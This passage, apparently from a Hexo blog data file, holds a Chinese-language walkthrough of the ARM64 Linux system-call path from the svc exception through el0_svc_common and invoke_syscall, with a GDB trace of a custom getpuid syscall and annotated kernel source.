NO_SYSCALL)\n        goto trace_exit;\n}\nhas_syscall_work(flags)：检查是否有系统调用需要处理的额外工作，例如 ptrace 相关的操作。\n如果系统调用号为 NO_SYSCALL，设置返回值为 -ENOSYS（系统调用不存在）。\nsyscall_trace_enter(regs)：处理系统调用进入的跟踪逻辑，并返回可能修改过的系统调用号。\n如果系统调用号仍然是 NO_SYSCALL，跳转到 trace_exit 标签，进行系统调用退出的跟踪逻辑。\n调用具体的系统调用\n\ninvoke_syscall(regs, scno, sc_nr, syscall_table);\ninvoke_syscall(regs, scno, sc_nr, syscall_table)：调用系统调用表中的具体系统调用函数。\n检查和处理系统调用退出的跟踪逻辑\n\nif (!has_syscall_work(flags) && !IS_ENABLED(CONFIG_DEBUG_RSEQ)) {\n    flags = read_thread_flags();\n    if (!has_syscall_work(flags) && !(flags & _TIF_SINGLESTEP))\n        return;\n}\n\ntrace_exit:\nsyscall_trace_exit(regs);\n再次检查是否有系统调用需要处理的额外工作以及是否启用了 RSEQ（重启动序列）调试。\n如果没有额外工作需要处理，并且没有启用单步调试，则直接返回。\n如果有工作需要处理，或者启用了单步调试，调用 syscall_trace_exit(regs) 进行系统调用退出的跟踪逻辑。\n总结\nel0_svc_common 函数处理系统调用的主要逻辑，包括：\n\n保存上下文：保存原始寄存器值和系统调用号。\n处理异步标记检查故障：在系统调用实际执行前，处理异步标记检查故障。\n处理系统调用的额外工作：包括 ptrace 相关的操作。\n调用具体的系统调用：根据系统调用号，从系统调用表中调用具体的系统调用函数。\n处理系统调用退出的跟踪逻辑：包括检查系统调用退出时是否需要进行额外的处理。\n通过这些步骤，确保系统调用的执行是安全且符合预期的，同时处理了系统调用前后的各种特殊情况。\n\n6.invoke_syscall()\n```\nstatic void invoke_syscall(struct pt_regs *regs, unsigned int scno,\n\t\t\t   unsigned int sc_nr,\n\t\t\t   const syscall_fn_t syscall_table[])\n{\n\tlong ret;\n\n\tadd_random_kstack_offset();\n\n\tif (scno < sc_nr) {\n\t\tsyscall_fn_t syscall_fn;\n\t\tsyscall_fn = syscall_table[array_index_nospec(scno, sc_nr)];\n\t\tret = __invoke_syscall(regs, syscall_fn);\n\t} else {\n\t\tret = do_ni_syscall(regs, scno);\n\t}\n\n\tsyscall_set_return_value(current, regs, 0, ret);\n\n\t/*\n\t * Ultimately, this value will get limited by KSTACK_OFFSET_MAX(),\n\t * but not enough for arm64 stack utilization comfort. To keep\n\t * reasonable stack head room, reduce the maximum offset to 9 bits.\n\t *\n\t * The actual entropy will be further reduced by the compiler when\n\t * applying stack alignment constraints: the AAPCS mandates a\n\t * 16-byte (i.e. 4-bit) aligned SP at function boundaries.\n\t *\n\t * The resulting 5 bits of entropy is seen in SP[8:4].\n\t */\n\tchoose_random_kstack_offset(get_random_u16() & 0x1FF);\n}\n```\n\n让我们按照之前的规则对 invoke_syscall 函数进行详细解析。这段代码用于调用系统调用处理函数，根据系统调用号选择合适的系统调用处理程序，并设置返回值。\n\n函数定义\n\nstatic void invoke_syscall(struct pt_regs *regs, unsigned int scno,\n\t\t\t   unsigned int sc_nr,\n\t\t\t   const syscall_fn_t syscall_table[])\nstatic：表示这个函数在定义它的文件中是私有的，不能被其他文件引用。\nvoid：表示函数不返回任何值。\ninvoke_syscall：函数名，处理系统调用的实际执行。\nstruct pt_regs *regs：一个指向保存异常发生时 CPU 寄存器状态的结构体的指针。\nunsigned int scno：系统调用号。\nunsigned int sc_nr：系统调用的总数量。\nconst syscall_fn_t syscall_table[]：系统调用表，包含所有系统调用的函数指针。\n函数实现\n添加随机堆栈偏移\n\nadd_random_kstack_offset();\nadd_random_kstack_offset()：这个函数用于添加一个随机的内核堆栈偏移，增加堆栈布局的随机性以提高安全性。\n调用具体的系统调用\n\nif (scno < sc_nr) {\n\tsyscall_fn_t syscall_fn;\n\tsyscall_fn = syscall_table[array_index_nospec(scno, sc_nr)];\n\tret = __invoke_syscall(regs, syscall_fn);\n} else {\n\tret = do_ni_syscall(regs, scno);\n}\nif (scno < sc_nr)：检查系统调用号是否在有效范围内（即是否小于总的系统调用数量）。\n有效系统调用：\nsyscall_fn_t syscall_fn;：声明一个系统调用函数指针。\nsyscall_fn = syscall_table[array_index_nospec(scno, sc_nr)];：从系统调用表中获取对应的系统调用函数，使用 array_index_nospec 来防止投机执行漏洞。\nret = __invoke_syscall(regs, syscall_fn);：调用具体的系统调用处理函数，并将返回值保存到 ret 中。\n无效系统调用：\nret = do_ni_syscall(regs, scno);：调用未实现的系统调用处理函数 do_ni_syscall，并将返回值保存到 ret 中。\n设置系统调用返回值\n\nsyscall_set_return_value(current, regs, 0, ret);\nsyscall_set_return_value(current, regs, 0, ret)：设置系统调用的返回值。\ncurrent：当前进程的任务结构指针。\nregs：保存寄存器状态的结构指针。\n0：系统调用成功的标志（通常为 0）。\nret：系统调用的返回值。\n选择新的随机堆栈偏移\n\n/*\n * Ultimately, this value will get limited by KSTACK_OFFSET_MAX(),\n * but not enough for arm64 stack utilization comfort. To keep\n * reasonable stack head room, reduce the maximum offset to 9 bits.\n *\n * The actual entropy will be further reduced by the compiler when\n * applying stack alignment constraints: the AAPCS mandates a\n * 16-byte (i.e. 4-bit) aligned SP at function boundaries.\n *\n * The resulting 5 bits of entropy is seen in SP[8:4].\n */\nchoose_random_kstack_offset(get_random_u16() & 0x1FF);\n注释部分解释了为什么要限制堆栈偏移值，并确保其合理性和安全性。\nchoose_random_kstack_offset(get_random_u16() & 0x1FF)：选择一个新的随机堆栈偏移值。\nget_random_u16() & 0x1FF：生成一个 16 位的随机数，并将其与 0x1FF 进行与操作，限制偏移值在 9 位以内。\n总结\ninvoke_syscall 函数主要负责调用系统调用处理函数，具体步骤如下：\n\n添加随机堆栈偏移：通过 add_random_kstack_offset() 增加堆栈布局的随机性。\n检查系统调用号的有效性：如果系统调用号在有效范围内，从系统调用表中获取对应的处理函数并调用它；否则调用未实现的系统调用处理函数。\n设置系统调用返回值：通过 syscall_set_return_value(current, regs, 0, ret) 设置系统调用的返回值。\n选择新的随机堆栈偏移：通过 choose_random_kstack_offset(get_random_u16() & 0x1FF) 选择一个新的随机堆栈偏移值。\n通过这些步骤，invoke_syscall 确保系统调用的执行过程是安全的，并增加了堆栈布局的随机性以提高安全性。\n\n\n7. static long __invoke_syscall(struct pt_regs *regs, syscall_fn_t syscall_fn)\n{\n\treturn syscall_fn(regs);\n}\n这里便开始执行真正的系统调用函数。\n","source":"_drafts/system_call.md","raw":"系统调用解析\n\ntrace:\n```\n───────────────────────────────────────────────────────────── code:arm64: ────\n   0xffff800080023758 <__arm64_sys_ni_syscall+0010> ldp    x29,  x30,  [sp],  #16\n   0xffff80008002375c <__arm64_sys_ni_syscall+0014> autiasp \n   0xffff800080023760 <__arm64_sys_ni_syscall+0018> ret    \n●→ 0xffff800080023764 <__arm64_sys_getpuid+0000> paciasp \n   0xffff800080023768 <__arm64_sys_getpuid+0004> stp    x29,  x30,  [sp,  #-208]!\n   0xffff80008002376c <__arm64_sys_getpuid+0008> mov    x4,  #0x800000000000        \t// #140737488355328\n   0xffff800080023770 <__arm64_sys_getpuid+000c> mov    x29,  sp\n   0xffff800080023774 <__arm64_sys_getpuid+0010> stp    x19,  x20,  [sp,  #16]\n   0xffff800080023778 <__arm64_sys_getpuid+0014> add    x19,  sp,  #0x50\n──────────────────────────────────── source:../arch/arm64/kernel/sys.c+39 ────\n     34\t \t\t!system_supports_32bit_el0())\n     35\t \t\treturn -EINVAL;\n     36\t \treturn ksys_personality(personality);\n     37\t }\n     38\t \n →   39\t SYSCALL_DEFINE2(getpuid,pid_t __user *, pid,uid_t __user *,uid){\n     40\t \tpid_t kpid;\n     41\t \tuid_t kuid;\n     42\t \tprintk(\"%s add syscall call\",__func__);\n     43\t \tif(pid == NULL && uid == NULL){\n     44\t \t\treturn -EINVAL;\n───────────────────────────────────────────────────────────────── threads ────\n[#0] Id 1, stopped 0xffff800081854eb8 in cpu_do_idle (), reason: BREAKPOINT\n[#1] Id 2, stopped 0xffff800080023764 in __arm64_sys_getpuid (), reason: BREAKPOINT\n─────────────────────────────────────────────────────────────────── trace ────\n[#0] 0xffff800080023764 → __arm64_sys_getpuid(regs=0xffff800086877eb0)\n[#1] 0xffff80008002dabc → __invoke_syscall(syscall_fn=<optimized out>, regs=0xffff800086877eb0)\n[#2] 0xffff80008002dabc → invoke_syscall(regs=0xffff800086877eb0, scno=0x1c9, sc_nr=0x1ca, syscall_table=0xffff8000818966c0 <sys_call_table>)\n[#3] 0xffff80008002dc58 → el0_svc_common(regs=0xffff800086877eb0, scno=0x1c9, sc_nr=0x1ca, syscall_table=0xffff8000818966c0 <sys_call_table>)\n[#4] 0xffff80008002dd68 → do_el0_svc(regs=0xffff800086877eb0)\n[#5] 0xffff8000818536d4 → el0_svc(regs=0xffff800086877eb0)\n[#6] 0xffff800081853a70 → el0t_64_sync_handler(regs=<optimized out>)\n[#7] 0xffff800080011d4c → el0t_64_sync()\n\n```\n1. 用户空间调用 syscall，触发 svc 0。\n2. CPU 进入内核模式，跳转到 el0t_64_sync。\n3. 异常处理函数 el0t_64_sync_handler 被调用。\n4. 进入 el0_svc 和 do_el0_svc 处理 SVC 异常。\n5. 调用 el0_svc_common，它负责查找和调用具体的系统调用处理函数。\n6. invoke_syscall 调用具体的系统调用处理函数。\n7. __invoke_syscall 执行具体的系统调用逻辑，例如 __arm64_sys_getpuid。\n\n\n1. 通过svc触发异常\n在用户空间程序执行 svc 0 后，会触发一个异常，使得 CPU 从用户模式切换到特权模式（内核模式），并执行相应的异常处理程序。\n```\nmov x8, #0           // 设置系统调用号到 x8 寄存器\nsvc 0                // 触发系统调用\n```\n\n2. 触发异常后，会调用el0t_64_sync\nel0代表此刻还在用户态\n其定义在：\narch/arm64/kernel/entry.S\n```\n\tentry_handler\t0, t, 64, sync\n```\nenter_handler 是个宏定义，定义如下\n```\n\t.macro entry_handler el:req, ht:req, regsize:req, label:req\nSYM_CODE_START_LOCAL(el\\el\\ht\\()_\\regsize\\()_\\label)\n\tkernel_entry \\el, \\regsize\n\tmov\tx0, sp\n\tbl\tel\\el\\ht\\()_\\regsize\\()_\\label\\()_handler\n\t.if \\el == 0\n\tb\tret_to_user\n\t.else\n\tb\tret_to_kernel\n\t.endif\nSYM_CODE_END(el\\el\\ht\\()_\\regsize\\()_\\label)\n\t.endm\n\n```\nSYM_CODE_START_LOCAL 宏：通常用于定义局部代码符号的开始，确保生成的汇编标签符合特定的格式，\n\n* el\\el\\ht\\()_\\regsize\\()_\\label：\n* * el\\el\\ht\\()_\\regsize\\()_\\label 这一部分展开成 el0t_64_sync，其中：\n* * * el\\el 是 el0。\n* * * ht 是 t。\n* * * regsize\\() 是 64_。\n* * * label 是 sync。\n* * 最终生成的符号名是 el0t_64_sync。\n* \\()_：\n\n* * * \\( )_ 表示在宏参数后插入一个下划线 _，以便将参数值与下一个部分连接起来。\n* * * 例如，\\regsize\\() 是 64_，即寄存器大小后跟一个下划线。\n\nkernel_entry 宏，它通常用于设置进入内核时的上下文环境。这包括禁用中断、保存上下文和切换到内核模式等操作。\n```\n\t.macro\tkernel_entry, el, regsize = 64\n\t.if\t\\el == 0\n\talternative_insn nop, SET_PSTATE_DIT(1), ARM64_HAS_DIT\n\t.endif\n\t.if\t\\regsize == 32\n\tmov\tw0, w0\t\t\t\t// zero upper 32 bits of x0\n\t.endif\n\tstp\tx0, x1, [sp, #16 * 0]\n\tstp\tx2, x3, [sp, #16 * 1]\n\tstp\tx4, x5, [sp, #16 * 2]\n\tstp\tx6, x7, [sp, #16 * 3]\n\tstp\tx8, x9, [sp, #16 * 4]\n\tstp\tx10, x11, [sp, #16 * 5]\n\tstp\tx12, x13, [sp, #16 * 6]\n\tstp\tx14, x15, [sp, #16 * 7]\n\tstp\tx16, x17, [sp, #16 * 8]\n\tstp\tx18, x19, [sp, #16 * 9]\n\tstp\tx20, x21, [sp, #16 * 10]\n\tstp\tx22, x23, [sp, #16 * 11]\n\tstp\tx24, x25, [sp, #16 * 12]\n\tstp\tx26, x27, [sp, #16 * 13]\n\tstp\tx28, x29, [sp, #16 * 14]\n\n    ...\n    .endm\n```\n3. 调用 el0t_64_sync_handler\n主要处理从 EL0（用户态）到 EL1（内核态）的64位同步异常\n\n函数定义和初始化\n```\nasmlinkage void noinstr el0t_64_sync_handler(struct pt_regs *regs)\n{\n\tunsigned long esr = read_sysreg(esr_el1);\n\n\n```\nasmlinkage：这是一个宏，通常用于指定函数的调用约定，确保参数通过堆栈传递而不是通过寄存器传递。这对于内核和用户态之间的调用非常重要。\nnoinstr：这是一种属性，指示编译器不要在这个函数中插入调试或分析相关的指令。\nel0t_64_sync_handler：函数名，处理 EL0 到 EL1 的64位同步异常。\nstruct pt_regs *regs：一个指向保存异常发生时 CPU 寄存器状态的结构体的指针。\nunsigned long esr = read_sysreg(esr_el1)：读取异常综合寄存器（ESR），这个寄存器包含了异常的详细信息。\nESR_ELx_EC_SVC64：处理系统调用异常\n\n```\nswitch (ESR_ELx_EC(esr)) {\n\tcase ESR_ELx_EC_SVC64:\n\t\tel0_svc(regs);\n\t\tbreak;\n}\n```\n4. el0_svc\n```\nstatic void noinstr el0_svc(struct pt_regs *regs)\n{\n\tenter_from_user_mode(regs);\n\tcortex_a76_erratum_1463225_svc_handler();\n\tfp_user_discard();\n\tlocal_daif_restore(DAIF_PROCCTX);\n\tdo_el0_svc(regs);\n\texit_to_user_mode(regs);\n}\n\n```\n这段代码定义了一个静态函数 el0_svc，用于处理从用户态（EL0）到内核态（EL1）的系统调用（SVC，Supervisor Call）异常。让我们按照之前解释的规则对这段代码进行详细解析。\n\n函数定义\n\nstatic void noinstr el0_svc(struct pt_regs *regs)\nstatic：表示这个函数在定义它的文件中是私有的，不能被其他文件引用。\nnoinstr：这个属性指示编译器不要在这个函数中插入调试或分析相关的指令。\nvoid：表示函数不返回任何值。\nel0_svc：函数名，处理从EL0到EL1的系统调用异常。\nstruct pt_regs *regs：一个指向保存异常发生时CPU寄存器状态的结构体的指针。\n函数实现\n```\n{\n\tenter_from_user_mode(regs);\n\tcortex_a76_erratum_1463225_svc_handler();\n\tfp_user_discard();\n\tlocal_daif_restore(DAIF_PROCCTX);\n\tdo_el0_svc(regs);\n\texit_to_user_mode(regs);\n}\n```\n1. enter_from_user_mode(regs)\n\nenter_from_user_mode(regs);\n这个函数将上下文从用户模式切换到内核模式。它通常包括保存用户态寄存器、设置内核态堆栈等操作。\n2. cortex_a76_erratum_1463225_svc_handler()\n\ncortex_a76_erratum_1463225_svc_handler();\n这是一个特定于 Cortex-A76 处理器的错误处理程序。这个函数处理 Cortex-A76 处理器中的特定硬件错误（erratum 1463225）。\n3. fp_user_discard()\n\nfp_user_discard();\n这个函数用于丢弃用户态的浮点上下文，以确保在内核态不会使用用户态的浮点寄存器。这通常是为了安全性和上下文切换的正确性。\n4. local_daif_restore(DAIF_PROCCTX)\n\nlocal_daif_restore(DAIF_PROCCTX);\n这个函数用于恢复中断状态。DAIF_PROCCTX 是一个标志，用于指示当前的处理器上下文。这个函数通常会重新使能中断或其他处理器状态。\n5. do_el0_svc(regs)\n\ndo_el0_svc(regs);\n这个函数处理实际的系统调用逻辑。regs 包含了系统调用号和参数，通过这个函数调用具体的系统调用处理函数。\n6. exit_to_user_mode(regs)\n\nexit_to_user_mode(regs);\n这个函数将上下文从内核模式切换回用户模式。它通常包括恢复用户态寄存器、设置用户态堆栈等操作。\n\n总结\nel0_svc 函数处理从用户态到内核态的系统调用异常。具体步骤如下：\n\n* 进入内核模式：通过 enter_from_user_mode 保存用户态上下文并切换到内核模式。\n* 处理特定处理器错误：通过 cortex_a76_erratum_1463225_svc_handler 处理 Cortex-A76 处理器的特定错误。\n* 丢弃用户态浮点上下文：通过 fp_user_discard 确保内核态不会使用用户态浮点寄存器。\n* 恢复中断状态：通过 local_daif_restore 恢复处理器的中断状态。\n* 处理系统调用：通过 do_el0_svc 调用具体的系统调用处理函数。\n返回用户模式：通过 exit_to_user_mode 恢复用户态上下文并返回用户模式。\n\n5. do_el0_svc\n```\nvoid do_el0_svc(struct pt_regs *regs)\n{\n\tel0_svc_common(regs, regs->regs[8], __NR_syscalls, sys_call_table);\n}\n```\n\n5. el0_sev_common\n\n函数定义\n\nstatic void el0_svc_common(struct pt_regs *regs, int scno, int sc_nr,\n                           const syscall_fn_t syscall_table[])\nstatic：表示这个函数在定义它的文件中是私有的，不能被其他文件引用。\nvoid：表示函数不返回任何值。\nel0_svc_common：函数名，处理从 EL0（用户态）到 EL1（内核态）的系统调用。\nstruct pt_regs *regs：一个指向保存异常发生时 CPU 寄存器状态的结构体的指针。\nint scno：系统调用号。\nint sc_nr：系统调用的总数量。\nconst syscall_fn_t syscall_table[]：系统调用表，包含所有系统调用的函数指针。\n函数实现\n初始化和上下文保存\n\nunsigned long flags = read_thread_flags();\n\nregs->orig_x0 = regs->regs[0];\nregs->syscallno = scno;\nread_thread_flags()：读取当前线程的标志。\nregs->orig_x0 = regs->regs[0]：保存原始的 x0 寄存器值。\nregs->syscallno = scno：保存系统调用号。\n注释部分：BTI 处理说明\n\n/*\n * BTI note:\n * The architecture does not guarantee that SPSR.BTYPE is zero\n * on taking an SVC, so we could return to userspace with a\n * non-zero BTYPE after the syscall.\n *\n * This shouldn't matter except when userspace is explicitly\n * doing something stupid, such as setting PROT_BTI on a page\n * that lacks conforming BTI/PACIxSP instructions, falling\n * through from one executable page to another with differing\n * PROT_BTI, or messing with BTYPE via ptrace: in such cases,\n * userspace should not be surprised if a SIGILL occurs on\n * syscall return.\n *\n * So, don't touch regs->pstate & PSR_BTYPE_MASK here.\n * (Similarly for HVC and SMC elsewhere.)\n */\n这段注释解释了 BTI（Branch Target Identification）的处理和可能出现的问题。主要说明不要修改 regs->pstate 中的 PSR_BTYPE_MASK 位。\n处理异步标记检查故障\n\nif (flags & _TIF_MTE_ASYNC_FAULT) {\n    syscall_set_return_value(current, regs, -ERESTARTNOINTR, 0);\n    return;\n}\n检查 _TIF_MTE_ASYNC_FAULT 标志，如果设置了这个标志，表示有异步的标记检查故障需要处理。\nsyscall_set_return_value(current, regs, -ERESTARTNOINTR, 0)：设置系统调用返回值为 -ERESTARTNOINTR，表示系统调用需要重启。\nreturn：返回，不继续执行后续的系统调用处理。\n处理系统调用的额外工作\n\nif (has_syscall_work(flags)) {\n    if (scno == NO_SYSCALL)\n        syscall_set_return_value(current, regs, -ENOSYS, 0);\n    scno = syscall_trace_enter(regs);\n    if (scno == NO_SYSCALL)\n        goto trace_exit;\n}\nhas_syscall_work(flags)：检查是否有系统调用需要处理的额外工作，例如 ptrace 相关的操作。\n如果系统调用号为 NO_SYSCALL，设置返回值为 -ENOSYS（系统调用不存在）。\nsyscall_trace_enter(regs)：处理系统调用进入的跟踪逻辑，并返回可能修改过的系统调用号。\n如果系统调用号仍然是 NO_SYSCALL，跳转到 trace_exit 标签，进行系统调用退出的跟踪逻辑。\n调用具体的系统调用\n\ninvoke_syscall(regs, scno, sc_nr, syscall_table);\ninvoke_syscall(regs, scno, sc_nr, syscall_table)：调用系统调用表中的具体系统调用函数。\n检查和处理系统调用退出的跟踪逻辑\n\nif (!has_syscall_work(flags) && !IS_ENABLED(CONFIG_DEBUG_RSEQ)) {\n    flags = read_thread_flags();\n    if (!has_syscall_work(flags) && !(flags & _TIF_SINGLESTEP))\n        return;\n}\n\ntrace_exit:\nsyscall_trace_exit(regs);\n再次检查是否有系统调用需要处理的额外工作以及是否启用了 RSEQ（重启动序列）调试。\n如果没有额外工作需要处理，并且没有启用单步调试，则直接返回。\n如果有工作需要处理，或者启用了单步调试，调用 syscall_trace_exit(regs) 进行系统调用退出的跟踪逻辑。\n总结\nel0_svc_common 函数处理系统调用的主要逻辑，包括：\n\n保存上下文：保存原始寄存器值和系统调用号。\n处理异步标记检查故障：在系统调用实际执行前，处理异步标记检查故障。\n处理系统调用的额外工作：包括 ptrace 相关的操作。\n调用具体的系统调用：根据系统调用号，从系统调用表中调用具体的系统调用函数。\n处理系统调用退出的跟踪逻辑：包括检查系统调用退出时是否需要进行额外的处理。\n通过这些步骤，确保系统调用的执行是安全且符合预期的，同时处理了系统调用前后的各种特殊情况。\n\n6.invoke_syscall()\n```\nstatic void invoke_syscall(struct pt_regs *regs, unsigned int scno,\n\t\t\t   unsigned int sc_nr,\n\t\t\t   const syscall_fn_t syscall_table[])\n{\n\tlong ret;\n\n\tadd_random_kstack_offset();\n\n\tif (scno < sc_nr) {\n\t\tsyscall_fn_t syscall_fn;\n\t\tsyscall_fn = syscall_table[array_index_nospec(scno, sc_nr)];\n\t\tret = __invoke_syscall(regs, syscall_fn);\n\t} else {\n\t\tret = do_ni_syscall(regs, scno);\n\t}\n\n\tsyscall_set_return_value(current, regs, 0, ret);\n\n\t/*\n\t * Ultimately, this value will get limited by KSTACK_OFFSET_MAX(),\n\t * but not enough for arm64 stack utilization comfort. To keep\n\t * reasonable stack head room, reduce the maximum offset to 9 bits.\n\t *\n\t * The actual entropy will be further reduced by the compiler when\n\t * applying stack alignment constraints: the AAPCS mandates a\n\t * 16-byte (i.e. 4-bit) aligned SP at function boundaries.\n\t *\n\t * The resulting 5 bits of entropy is seen in SP[8:4].\n\t */\n\tchoose_random_kstack_offset(get_random_u16() & 0x1FF);\n}\n```\n\n让我们按照之前的规则对 invoke_syscall 函数进行详细解析。这段代码用于调用系统调用处理函数，根据系统调用号选择合适的系统调用处理程序，并设置返回值。\n\n函数定义\n\nstatic void invoke_syscall(struct pt_regs *regs, unsigned int scno,\n\t\t\t   unsigned int sc_nr,\n\t\t\t   const syscall_fn_t syscall_table[])\nstatic：表示这个函数在定义它的文件中是私有的，不能被其他文件引用。\nvoid：表示函数不返回任何值。\ninvoke_syscall：函数名，处理系统调用的实际执行。\nstruct pt_regs *regs：一个指向保存异常发生时 CPU 寄存器状态的结构体的指针。\nunsigned int scno：系统调用号。\nunsigned int sc_nr：系统调用的总数量。\nconst syscall_fn_t syscall_table[]：系统调用表，包含所有系统调用的函数指针。\n函数实现\n添加随机堆栈偏移\n\nadd_random_kstack_offset();\nadd_random_kstack_offset()：这个函数用于添加一个随机的内核堆栈偏移，增加堆栈布局的随机性以提高安全性。\n调用具体的系统调用\n\nif (scno < sc_nr) {\n\tsyscall_fn_t syscall_fn;\n\tsyscall_fn = syscall_table[array_index_nospec(scno, sc_nr)];\n\tret = __invoke_syscall(regs, syscall_fn);\n} else {\n\tret = do_ni_syscall(regs, scno);\n}\nif (scno < sc_nr)：检查系统调用号是否在有效范围内（即是否小于总的系统调用数量）。\n有效系统调用：\nsyscall_fn_t syscall_fn;：声明一个系统调用函数指针。\nsyscall_fn = syscall_table[array_index_nospec(scno, sc_nr)];：从系统调用表中获取对应的系统调用函数，使用 array_index_nospec 来防止投机执行漏洞。\nret = __invoke_syscall(regs, syscall_fn);：调用具体的系统调用处理函数，并将返回值保存到 ret 中。\n无效系统调用：\nret = do_ni_syscall(regs, scno);：调用未实现的系统调用处理函数 do_ni_syscall，并将返回值保存到 ret 中。\n设置系统调用返回值\n\nsyscall_set_return_value(current, regs, 0, ret);\nsyscall_set_return_value(current, regs, 0, ret)：设置系统调用的返回值。\ncurrent：当前进程的任务结构指针。\nregs：保存寄存器状态的结构指针。\n0：系统调用成功的标志（通常为 0）。\nret：系统调用的返回值。\n选择新的随机堆栈偏移\n\n/*\n * Ultimately, this value will get limited by KSTACK_OFFSET_MAX(),\n * but not enough for arm64 stack utilization comfort. To keep\n * reasonable stack head room, reduce the maximum offset to 9 bits.\n *\n * The actual entropy will be further reduced by the compiler when\n * applying stack alignment constraints: the AAPCS mandates a\n * 16-byte (i.e. 4-bit) aligned SP at function boundaries.\n *\n * The resulting 5 bits of entropy is seen in SP[8:4].\n */\nchoose_random_kstack_offset(get_random_u16() & 0x1FF);\n注释部分解释了为什么要限制堆栈偏移值，并确保其合理性和安全性。\nchoose_random_kstack_offset(get_random_u16() & 0x1FF)：选择一个新的随机堆栈偏移值。\nget_random_u16() & 0x1FF：生成一个 16 位的随机数，并将其与 0x1FF 进行与操作，限制偏移值在 9 位以内。\n总结\ninvoke_syscall 函数主要负责调用系统调用处理函数，具体步骤如下：\n\n添加随机堆栈偏移：通过 add_random_kstack_offset() 增加堆栈布局的随机性。\n检查系统调用号的有效性：如果系统调用号在有效范围内，从系统调用表中获取对应的处理函数并调用它；否则调用未实现的系统调用处理函数。\n设置系统调用返回值：通过 syscall_set_return_value(current, regs, 0, ret) 设置系统调用的返回值。\n选择新的随机堆栈偏移：通过 choose_random_kstack_offset(get_random_u16() & 0x1FF) 选择一个新的随机堆栈偏移值。\n通过这些步骤，invoke_syscall 确保系统调用的执行过程是安全的，并增加了堆栈布局的随机性以提高安全性。\n\n\n7. static long __invoke_syscall(struct pt_regs *regs, syscall_fn_t syscall_fn)\n{\n\treturn syscall_fn(regs);\n}\n这里便开始执行真正的系统调用函数。\n","slug":"system_call","published":0,"date":"2024-07-12T15:52:34.901Z","updated":"2024-07-12T15:52:34.901Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit0000gv8fyebrh54h7","content":"<p>系统调用解析</p>\n<p>trace:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">───────────────────────────────────────────────────────────── code:arm64: ────</span><br><span class=\"line\">   0xffff800080023758 &lt;__arm64_sys_ni_syscall+0010&gt; ldp    x29,  x30,  [sp],  #16</span><br><span class=\"line\">   0xffff80008002375c &lt;__arm64_sys_ni_syscall+0014&gt; autiasp </span><br><span class=\"line\">   0xffff800080023760 &lt;__arm64_sys_ni_syscall+0018&gt; ret    </span><br><span class=\"line\">●→ 0xffff800080023764 &lt;__arm64_sys_getpuid+0000&gt; paciasp </span><br><span class=\"line\">   0xffff800080023768 &lt;__arm64_sys_getpuid+0004&gt; stp    x29,  x30,  [sp,  #-208]!</span><br><span class=\"line\">   0xffff80008002376c &lt;__arm64_sys_getpuid+0008&gt; mov    x4,  #0x800000000000        \t// #140737488355328</span><br><span class=\"line\">   0xffff800080023770 &lt;__arm64_sys_getpuid+000c&gt; mov    x29,  sp</span><br><span class=\"line\">   0xffff800080023774 &lt;__arm64_sys_getpuid+0010&gt; stp    x19,  x20,  [sp,  #16]</span><br><span class=\"line\">   0xffff800080023778 &lt;__arm64_sys_getpuid+0014&gt; add    x19,  sp,  #0x50</span><br><span class=\"line\">──────────────────────────────────── source:../arch/arm64/kernel/sys.c+39 ────</span><br><span class=\"line\">     34\t \t\t!system_supports_32bit_el0())</span><br><span class=\"line\">     35\t \t\treturn -EINVAL;</span><br><span class=\"line\">     36\t \treturn ksys_personality(personality);</span><br><span class=\"line\">     37\t &#125;</span><br><span class=\"line\">     38\t </span><br><span class=\"line\"> →   39\t SYSCALL_DEFINE2(getpuid,pid_t __user *, pid,uid_t __user *,uid)&#123;</span><br><span class=\"line\">     40\t \tpid_t kpid;</span><br><span class=\"line\">     41\t \tuid_t kuid;</span><br><span class=\"line\">     42\t \tprintk(&quot;%s add syscall call&quot;,__func__);</span><br><span class=\"line\">     43\t \tif(pid == NULL &amp;&amp; uid == NULL)&#123;</span><br><span class=\"line\">     44\t \t\treturn -EINVAL;</span><br><span class=\"line\">───────────────────────────────────────────────────────────────── threads ────</span><br><span class=\"line\">[#0] Id 1, stopped 0xffff800081854eb8 in cpu_do_idle (), reason: BREAKPOINT</span><br><span class=\"line\">[#1] Id 2, stopped 0xffff800080023764 in __arm64_sys_getpuid (), reason: BREAKPOINT</span><br><span class=\"line\">─────────────────────────────────────────────────────────────────── trace ────</span><br><span class=\"line\">[#0] 0xffff800080023764 → __arm64_sys_getpuid(regs=0xffff800086877eb0)</span><br><span class=\"line\">[#1] 0xffff80008002dabc → __invoke_syscall(syscall_fn=&lt;optimized out&gt;, regs=0xffff800086877eb0)</span><br><span class=\"line\">[#2] 0xffff80008002dabc → invoke_syscall(regs=0xffff800086877eb0, scno=0x1c9, sc_nr=0x1ca, syscall_table=0xffff8000818966c0 &lt;sys_call_table&gt;)</span><br><span class=\"line\">[#3] 0xffff80008002dc58 → el0_svc_common(regs=0xffff800086877eb0, scno=0x1c9, sc_nr=0x1ca, syscall_table=0xffff8000818966c0 &lt;sys_call_table&gt;)</span><br><span class=\"line\">[#4] 0xffff80008002dd68 → do_el0_svc(regs=0xffff800086877eb0)</span><br><span class=\"line\">[#5] 0xffff8000818536d4 → el0_svc(regs=0xffff800086877eb0)</span><br><span class=\"line\">[#6] 0xffff800081853a70 → el0t_64_sync_handler(regs=&lt;optimized out&gt;)</span><br><span class=\"line\">[#7] 0xffff800080011d4c → el0t_64_sync()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ol>\n<li>用户空间调用 syscall，触发 